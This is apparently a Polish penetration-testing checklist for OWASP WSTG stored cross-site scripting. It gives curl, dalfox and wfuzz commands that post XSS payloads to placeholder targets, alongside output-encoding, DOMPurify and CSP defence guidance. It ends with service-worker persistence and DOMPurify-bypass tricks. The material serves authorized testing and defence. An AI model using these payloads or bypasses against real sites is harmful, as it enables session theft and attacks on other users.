# WSTG-INPV-02 — Testing for Stored Cross Site Scripting

## Cele

- Identify stored input that is reflected on the client-side
- Assess the input they accept and the encoding that gets applied on return

## KOMENDY

### Testowanie stored XSS w typowych polach

```bash
# Komentarze, profile, wiadomosci, formularze kontaktowe, tytuly
curl -X POST "https://TARGET/comment" -d "body=<script>alert('XSS')</script>" -H "Cookie: session=SESSION_TOKEN"
curl -X POST "https://TARGET/profile" -d "name=<img src=x onerror=alert(1)>" -H "Cookie: session=SESSION_TOKEN"
curl -X POST "https://TARGET/message" -d "content=<svg/onload=alert(1)>" -H "Cookie: session=SESSION_TOKEN"

```

### Testowanie z roznym kontekstem

```bash
curl -X POST "https://TARGET/comment" -d "body=\"onmouseover=\"alert(1)\"" -H "Cookie: session=SESSION_TOKEN"
curl -X POST "https://TARGET/comment" -d "body=javascript:alert(1)" -H "Cookie: session=SESSION_TOKEN"

```

### Sprawdzenie czy payload jest zapisany

```bash
curl -s "https://TARGET/comments" | grep -i "alert\|onerror\|onload\|onmouseover"

```

### dalfox w trybie stored

```bash
dalfox url "https://TARGET/comment" -X POST -d "body=FUZZ" --cookie "session=SESSION_TOKEN" -o output_dalfox_stored.txt

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings XSS payloads

```bash
# Uzyj w Burp Intruder na polach stored (komentarze, profile itp.)
# Wordlista: Desktop/WSTG/PayloadsAllTheThings-master/XSS Injection/Intruders/xss_alert.txt
# Wordlista: Desktop/WSTG/PayloadsAllTheThings-master/XSS Injection/Intruders/JHADDIX_XSS.txt
# Wordlista: Desktop/WSTG/PayloadsAllTheThings-master/XSS Injection/Intruders/XSS_Polyglots.txt

```

### wfuzz stored XSS

```bash
wfuzz -c -z file,"Desktop/WSTG/PayloadsAllTheThings-master/XSS Injection/Intruders/xss_alert.txt" -X POST -d "body=FUZZ" -b "session=SESSION_TOKEN" "https://TARGET/comment"

```

### SecLists XSS payloads

```bash
wfuzz -c -z file,"Desktop/WSTG/SecLists-master/Fuzzing/XSS/robot-friendly/XSS-Jhaddix.txt" -X POST -d "body=FUZZ" -b "session=SESSION_TOKEN" "https://TARGET/comment"

```

### fuzzdb XSS

```bash
wfuzz -c -z file,Desktop/WSTG/fuzzdb-master/attack/xss/xss-rsnake.txt -X POST -d "body=FUZZ" -b "session=SESSION_TOKEN" "https://TARGET/comment"

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj wszystkie pola ktore zapisuja dane (komentarze, profile, wiadomosci)
2. Wstaw unikalny string canary w kazde pole i sprawdz gdzie jest wyswietlany
3. Sprawdz kontekst wyswietlania: HTML, atrybut, JS, CSS
4. Wstaw payload XSS i sprawdz czy jest zapisany i renderowany
5. Testuj rozne kodowania i bypass WAF
6. Sprawdz czy payload wykonuje sie dla innych uzytkownikow
7. Testuj file upload z XSS w nazwie pliku lub metadanych (EXIF)
8. Sprawdz rich text editors i markdown parsery


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Cross_Site_Scripting_Prevention_Cheat_Sheet.md, XSS_Filter_Evasion_Cheat_Sheet.md

### Dlaczego Stored XSS jest krytyczny

- Stored XSS jest grozniejszy niz reflected — payload wykonuje sie dla KAZDEGO odwiedzajacego strone
- Moze prowadzic do: kradziezy sesji, impersonacji, keyloggingu, przekierowania na malware, defacement
- Czesto wystepuje w: komentarzach, profilach, wiadomosciach, forach, recenzjach, polu "about me"

### Output Encoding — klucz do obrony

- Enkoduj dane na WYJSCIU (output), nie na wejsciu — te same dane moga byc uzywane w roznych kontekstach
- Encoding musi byc dopasowany do kontekstu renderowania:
  - HTML Body: `&lt;`, `&gt;`, `&amp;`, `&quot;`, `&#x27;`
  - HTML Attribute: pelny encoding `&#xHH;` + ZAWSZE cudzylowy wokol atrybutow
  - JavaScript: `\xHH` encoding — zmienne TYLKO w quoted strings
  - URL: `%HH` encoding — tylko wartosc parametru
- Uzyj `.textContent` zamiast `.innerHTML` — to safe sink ktory automatycznie enkoduje

### HTML Sanitization dla rich content

- Jesli uzytkownik musi tworzyc formatowany HTML (WYSIWYG, markdown) — uzyj sanityzacji zamiast encodingu
- **DOMPurify** jest rekomendowany: `let clean = DOMPurify.sanitize(dirty);`
- NIE modyfikuj stringa PO sanityzacji — to uniewaznla zabezpieczenia
- NIE przekazuj sanityzowanego stringa do biblioteki ktora moze go zmutowac
- Regularnie aktualizuj DOMPurify — bypassy sa odkrywane regularnie

### Wektory ataku specyficzne dla Stored XSS

- Sprawdz uploady plikow pod katem XSS: SVG (moze zawierac `<script>`), HTML, XML, pliki z EXIF/metadanymi
- Rich text editory: sprawdz czy sanityzuja input — wiele z nich pozwala na bypass
- Markdown parsery: testuj wstrzykniecie HTML/JS przez markdown syntax
- Nazwy plikow: `"><img src=x onerror=alert(1)>.jpg` — jesli nazwa jest renderowana bez encodingu
- Metadane plikow (EXIF): XSS payload w polu komentarza/autora EXIF

### Framework Security i escape hatches

- React: `dangerouslySetInnerHTML` — jesli uzywany z user input bez sanityzacji = stored XSS
- Angular: `bypassSecurityTrustHtml()` — omija wbudowany sanitizer
- Vue: `v-html` — renderuje raw HTML, wymaga sanityzacji
- Nigdy nie lacz auto-escape frameworka z recznym renderowaniem HTML

### Dodatkowe warstwy obrony

- **CSP** z nonces: `script-src 'nonce-random'` — blokuje inline scripts nawet jesli XSS istnieje
- **HttpOnly cookies**: zapobiega kradziezy sesji przez `document.cookie`
- **X-Content-Type-Options: nosniff**: zapobiega MIME-sniffing uploadowanych plikow
- Input validation jako dodatkowa warstwa — NIE jako jedyna obrona

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| XSS Validator | Automatyczna walidacja XSS z Phantomjs | [GitHub](https://github.com/nVisium/xssValidator) |
| Burp Hunter | Plugin XSS Hunter do Burp | [GitHub](https://github.com/mystech7/Burp-Hunter) |
| feminda | Automatyczne wyszukiwanie blind XSS | [GitHub](https://github.com/wish-i-was/femida) |

---

## Wskazówki ASVS

Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas testu.

### L1 (Podstawowy)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V1.2.1 | Injection Prevention | Verify that output encoding for an HTTP response, HTML document, or XML document is relevant for the context required, such as encoding the relevant characters for HTML elements, HTML attributes, HTML comments, CSS, or HTTP header fields, to avoid changing the message or document structure. |
| V1.3.1 | Sanitization | Verify that all untrusted HTML input from WYSIWYG editors or similar is sanitized using a well-known and secure HTML sanitization library or framework feature. |
| V3.2.2 | Unintended Content Interpretation | Verify that content intended to be displayed as text, rather than rendered as HTML, is handled using safe rendering functions (such as createTextNode or textContent) to prevent unintended execution of content such as HTML or JavaScript. |

### L2 (Standardowy)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V1.3.3 | Sanitization | Verify that data being passed to a potentially dangerous context is sanitized beforehand to enforce safety measures, such as only allowing characters which are safe for this context and trimming input which is too long. |


---

## HackTricks Tips

### Persystencja i eskalacja

- **Service Worker persistence**: `navigator.serviceWorker.register('/uploaded/sw.js')` — przechwytuje requesty przez 24h po naprawie XSS
- **SW via JSONP** (bez uploadu): `navigator.serviceWorker.register("/jsonp?callback=onfetch=function(e){...}//", {scope: '/'})`
- **Chrome Cache XSS**: jeśli bfcache wyłączony (Puppeteer boty) → cached API response renderowany jako HTML po `history.back()`
- **WASM linear memory overwrite**: heap overflow w edycji nadpisuje template HTML w pamięci WASM → każdy kolejny render to XSS

### Bypass DOMPurify

- **DOMPurify + Marked parser**: sanitize-first, parse-second → markdown re-wprowadza wektory XSS po sanityzacji
- **`cid:` protocol bypass**: `<a id=x name=y href="cid:&quot;onerror=alert(1)//">` — `&quot;` dekodowane at runtime
